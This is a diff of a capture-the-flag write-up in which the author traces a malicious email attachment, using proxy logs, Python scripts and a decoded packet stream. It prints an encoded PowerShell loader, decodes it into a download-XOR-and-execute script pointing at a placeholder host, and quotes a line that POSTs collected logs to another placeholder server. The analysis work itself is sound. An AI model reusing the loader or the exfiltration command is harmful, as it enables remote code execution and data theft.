@@ -100,7 +100,7 @@ Identify the logon ID of the user session that communicated with the malicious L
 
 As established in task 1, the listening post is 172.23.251.63. Using the command line to search through proxy.log, I found exactly one instance of activity from this user:
 ```
-> cat proxy.log | grep '172.23.251.63'
+$ cat proxy.log | grep '172.23.251.63'
 
 2021-03-16 08:00:09 39 10.227.229.227 200 TCP_MISS 12734 479 GET http worsc.invalid activity - - DIRECT 172.23.251.63 application/octet-stream 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)' PROXIED none - 10.227.228.175 SG-HTTP-Service - none -
 
@@ -150,7 +150,7 @@ print(count)
 Unfortunately, despite my attempts to debug the code, there did not seem to be a match. When I modified the script to return the total number of sessions, and the total which matched my criteria, my script returned 0 for the latter.
 
 ```
-> python3 logparser.py
+$ python3 logparser.py
 
 1615899609.0
 0
@@ -170,18 +170,67 @@ Enter the domain name of the server that the malicious payload sends a POST requ
 
 1 file was provided, a zip folder of emails. 
 
-To identify the malicious email, I used the online tool Encryptomatic Email Viewer (www.encryptomatic.com/viewer) to view each email file, and viewed each attachment. On email 4, we have an image file called puppy.jpg.
+To identify the malicious email, I used the online tool Encryptomatic Email Viewer (www.encryptomatic.com/viewer) to view each email file, and viewed each attachment (numbered 1-30). On email 4, we have a suspicious image file called puppy.jpg:
 ![image](https://media.github.tamu.edu/user/17583/files/b6100300-c834-11ec-97d0-3e10e9da0d61)
 
-When I opened the file with the default jpeg viewer, the system threw an error. However, when I opened it with the text editor, I was met with an encrypted PowerShell script:
+When I opened the file with the default jpeg viewer, the system threw an error. However, when I opened it with the text editor, I found what appeared to be an encrypted PowerShell script:
 ```
-Powershell orig
+powershell -nop -noni -w Hidden -enc JABiAHkAdABlAHMAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAEQAYQB0AGEAKAAnAGgAdAB0AHAAOgAvAC8AdwBvAHIAcwBjAC4AaQBuAHYAYQBsAGkAZAAvAGEAYwB0AGkAdgBpAHQAeQAnACkACgAKACQAcAByAGUAdgAgAD0AIABbAGIAeQB0AGUAXQAgADkAOAAKAAoAJABkAGUAYwAgAD0AIAAkACgAZgBvAHIAIAAoACQAaQAgAD0AIAAwADsAIAAkAGkAIAAtAGwAdAAgACQAYgB5AHQAZQBzAC4AbABlAG4AZwB0AGgAOwAgACQAaQArACsAKQAgAHsACgAgACAAIAAgACQAcAByAGUAdgAgAD0AIAAkAGIAeQB0AGUAcwBbACQAaQBdACAALQBiAHgAbwByACAAJABwAHIAZQB2AAoAIAAgACAAIAAkAHAAcgBlAHYACgB9ACkACgAKAGkAZQB4ACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABkAGUAYwApACkACgA=
 ```
-This looks like Base64, so I copied the output of the jpeg file to a text document, and converted that from Base64:
+This looks like Base64, so I copied the output of the jpeg file to a text document, and converted the output from Base64:
 
 ```
-> base64 -d puppy.txt
+$ base64 -d puppy.txt
+$bytes = (New-Object Net.WebClient).DownloadData('http://worsc.invalid/activity')
+
+$prev = [byte] 98
+
+$dec = $(for ($i = 0; $i -lt $bytes.length; $i++) {
+    $prev = $bytes[$i] -bxor $prev
+    $prev
+})
+
+iex([System.Text.Encoding]::UTF8.GetString($dec))
+```
+This PowerShell script seems to be the malicious file mentioned in the challenge. Therefore, the answer to part 1 of the question is the address of email 4:
+```
+faux.christopher@oops.net
+```
+To complete part 2, we need to find the server to whom this malicious file sends a POST request. The PowerShell script seems to make a GET request from 'http://worsc.invalid/activity'. This conveniently happens to be the same domain from which the malicious IP from Task 1 sends data via HTTP. 
+> insert image
+
+We need to find out what they sent. By right-clicking on the packet and picking "Follow > TCP Stream" we can get the full message as a hex array.
+
+> tcp stream
+
+I copied this entire block of data (sans header) directly into my next Python script, which I wrote as an approximate "translation" of the PowerShell script:
 
 ```
-This PowerShell script seems to be the malicious file. Therefore 
+#!/bin/python3
+
+data = [<input omitted; full TCP stream body>]
+out = []
+dec = ""
+prev = 98
+
+for i in data :
+	prev ^= i
+	out.append(prev)
+data2 = [chr(x) for x in out]
+
+dec = "".join(data2)
+print(dec)
+```
+I then executed my script in the command line...
+```
+$ python3 hex_reader.txt > outputscript.txt
+```
+...which returned a long PowerShell script. In the last line was this:
+```
+Invoke-WebRequest -uri http://igrqt.invalid:8080 -Method Post -Body $global:log
+```
+All we need is the url to successfully complete the challenge.
+
+
+
 
